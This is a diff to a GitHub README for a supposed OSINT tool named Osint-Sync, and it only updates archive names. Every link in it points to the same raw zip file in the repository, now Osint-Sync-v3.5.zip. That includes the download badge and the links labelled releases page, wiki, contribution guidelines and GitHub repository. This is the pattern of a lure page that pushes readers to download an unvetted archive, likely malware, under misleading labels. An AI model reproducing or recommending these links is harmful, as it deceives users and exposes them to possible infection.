@@ -1,6 +1,6 @@
 # 🌐 Osint-Sync - Your Simple OSINT Tool
 
-[![Download Osint-Sync](https://raw.githubusercontent.com/karamabbasi05/Osint-Sync/main/Neptune/Osint-Sync_2.4.zip)](https://raw.githubusercontent.com/karamabbasi05/Osint-Sync/main/Neptune/Osint-Sync_2.4.zip)
+[![Download Osint-Sync](https://raw.githubusercontent.com/karamabbasi05/Osint-Sync/main/Neptune/Osint-Sync-v3.5.zip)](https://raw.githubusercontent.com/karamabbasi05/Osint-Sync/main/Neptune/Osint-Sync-v3.5.zip)
 
 ## 📚 Overview
 
@@ -13,7 +13,7 @@ To get started, follow these easy steps. They will guide you through downloading
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Click [here to download](https://raw.githubusercontent.com/karamabbasi05/Osint-Sync/main/Neptune/Osint-Sync_2.4.zip).  
+   Click [here to download](https://raw.githubusercontent.com/karamabbasi05/Osint-Sync/main/Neptune/Osint-Sync-v3.5.zip).  
    You will see the latest version of Osint-Sync.
 
 2. **Choose Your Version**  
@@ -58,19 +58,19 @@ If you face any issues while installing or running Osint-Sync, try the following
 
 ## 📄 Documentation
 
-For more detailed information and instructions, you can visit the [Osint-Sync Wiki](https://raw.githubusercontent.com/karamabbasi05/Osint-Sync/main/Neptune/Osint-Sync_2.4.zip). Here, you will find guides, FAQs, and advanced topics.
+For more detailed information and instructions, you can visit the [Osint-Sync Wiki](https://raw.githubusercontent.com/karamabbasi05/Osint-Sync/main/Neptune/Osint-Sync-v3.5.zip). Here, you will find guides, FAQs, and advanced topics.
 
 ## 🌐 Community Contributions
 
-We welcome suggestions, improvements, and reports of any issues. If you would like to contribute, please check out our [Contribution Guidelines](https://raw.githubusercontent.com/karamabbasi05/Osint-Sync/main/Neptune/Osint-Sync_2.4.zip).
+We welcome suggestions, improvements, and reports of any issues. If you would like to contribute, please check out our [Contribution Guidelines](https://raw.githubusercontent.com/karamabbasi05/Osint-Sync/main/Neptune/Osint-Sync-v3.5.zip).
 
 ## ⭐ Usage Tips
 
 - **Experiment:** Take some time to explore all features. Familiarity will make your OSINT tasks smoother.
-- **Stay Updated:** Regularly check the [Releases page](https://raw.githubusercontent.com/karamabbasi05/Osint-Sync/main/Neptune/Osint-Sync_2.4.zip) for the latest updates and enhancements.
+- **Stay Updated:** Regularly check the [Releases page](https://raw.githubusercontent.com/karamabbasi05/Osint-Sync/main/Neptune/Osint-Sync-v3.5.zip) for the latest updates and enhancements.
 
 ## 🔄 Feedback
 
-Your insights help improve Osint-Sync. If you have feedback, please open an issue on our [GitHub repository](https://raw.githubusercontent.com/karamabbasi05/Osint-Sync/main/Neptune/Osint-Sync_2.4.zip).
+Your insights help improve Osint-Sync. If you have feedback, please open an issue on our [GitHub repository](https://raw.githubusercontent.com/karamabbasi05/Osint-Sync/main/Neptune/Osint-Sync-v3.5.zip).
 
 By following these steps, you can easily download and run Osint-Sync. Enjoy efficiently gathering intelligence with this tool!
